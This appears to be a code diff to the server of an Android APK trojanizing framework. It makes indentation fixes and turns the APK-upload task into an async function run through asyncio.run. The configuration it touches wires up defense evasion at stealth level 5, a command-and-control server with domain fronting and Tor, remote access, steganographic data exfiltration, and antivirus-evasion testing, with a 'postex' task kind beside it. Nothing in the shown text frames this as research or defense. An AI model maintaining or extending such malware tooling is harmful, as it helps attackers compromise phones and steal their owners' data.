@@ -446,7 +446,7 @@ class AdvancedAPKProcessor:
         except Exception as e:
             print(f"Signing error: {e}")
 
-def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
+async def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
     """Process uploaded APK with Phase 3 ultimate advanced modifications"""
     t = tasks[task_id]
     
@@ -523,65 +523,65 @@ def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
         evasion_level=5,
         stealth_mode=True
     )
-            defense_evasion_engine = DefenseEvasionEngine(defense_evasion_config)
+    defense_evasion_engine = DefenseEvasionEngine(defense_evasion_config)
         
-        # Initialize Phase 5 engines with advanced configurations
-        c2_config = C2Config(
-            server_host="192.168.1.100", 
-            server_port=8443,
-            use_https=True,
-            domain_fronting_enabled=True,
-            tor_enabled=True,
-            encryption_enabled=True,
-            heartbeat_interval=60
-        )
+    # Initialize Phase 5 engines with advanced configurations
+    c2_config = C2Config(
+        server_host="192.168.1.100", 
+        server_port=8443,
+        use_https=True,
+        domain_fronting_enabled=True,
+        tor_enabled=True,
+        encryption_enabled=True,
+        heartbeat_interval=60
+    )
+    
+    remote_access_config = RemoteAccessConfig(
+        encryption_enabled=True,
+        stealth_mode=True,
+        auto_cleanup=True,
+        max_concurrent_operations=3
+    )
+    
+    exfiltration_config = ExfiltrationConfig(
+        steganography_enabled=True,
+        encryption_enabled=True,
+        auto_sync_enabled=True,
+        sync_interval_hours=6
+    )
+    
+    c2_infrastructure = C2Infrastructure(c2_config)
+    remote_access_system = RemoteAccessSystem(remote_access_config)
+    data_exfiltration_system = DataExfiltrationSystem(exfiltration_config)
         
-        remote_access_config = RemoteAccessConfig(
-            encryption_enabled=True,
-            stealth_mode=True,
-            auto_cleanup=True,
-            max_concurrent_operations=3
-        )
-        
-        exfiltration_config = ExfiltrationConfig(
-            steganography_enabled=True,
-            encryption_enabled=True,
-            auto_sync_enabled=True,
-            sync_interval_hours=6
-        )
-        
-        c2_infrastructure = C2Infrastructure(c2_config)
-        remote_access_system = RemoteAccessSystem(remote_access_config)
-        data_exfiltration_system = DataExfiltrationSystem(exfiltration_config)
-        
-        # Initialize Phase 6 Testing and Optimization Systems
-        performance_config = PerformanceConfig(
-            optimization_level=PerformanceLevel.AGGRESSIVE,
-            memory_limit_mb=128,
-            cpu_throttling_enabled=True,
-            network_optimization=True,
-            startup_optimization=True,
-            enable_monitoring=True
-        )
-        
-        compatibility_config = CompatibilityConfig(
-            min_api_level=21,
-            max_api_level=34,
-            comprehensive_testing=True,
-            performance_testing=True
-        )
-        
-        security_config = SecurityTestConfig(
-            test_antivirus_evasion=True,
-            test_behavioral_bypass=True,
-            test_static_analysis=True,
-            comprehensive_testing=True,
-            real_time_testing=True
-        )
-        
-        performance_system = PerformanceOptimizationSystem(performance_config)
-        compatibility_system = CompatibilityTestingSystem(compatibility_config)
-        security_system = SecurityTestingSystem(security_config)
+    # Initialize Phase 6 Testing and Optimization Systems
+    performance_config = PerformanceConfig(
+        optimization_level=PerformanceLevel.AGGRESSIVE,
+        memory_limit_mb=128,
+        cpu_throttling_enabled=True,
+        network_optimization=True,
+        startup_optimization=True,
+        enable_monitoring=True
+    )
+    
+    compatibility_config = CompatibilityConfig(
+        min_api_level=21,
+        max_api_level=34,
+        comprehensive_testing=True,
+        performance_testing=True
+    )
+    
+    security_config = SecurityTestConfig(
+        test_antivirus_evasion=True,
+        test_behavioral_bypass=True,
+        test_static_analysis=True,
+        comprehensive_testing=True,
+        real_time_testing=True
+    )
+    
+    performance_system = PerformanceOptimizationSystem(performance_config)
+    compatibility_system = CompatibilityTestingSystem(compatibility_config)
+    security_system = SecurityTestingSystem(security_config)
     
     try:
         with locks[task_id]:
@@ -1759,7 +1759,7 @@ def create_task(req: CreateTaskRequest):
         elif req.kind == "postex":
             run_postex_task(t.id, base, t.params)
         elif req.kind == "upload_apk":
-            run_upload_apk_task(t.id, base, t.params)
+            asyncio.run(run_upload_apk_task(t.id, base, t.params))
     threading.Thread(target=runner, daemon=True).start()
     return TaskResponse(task=t)
 
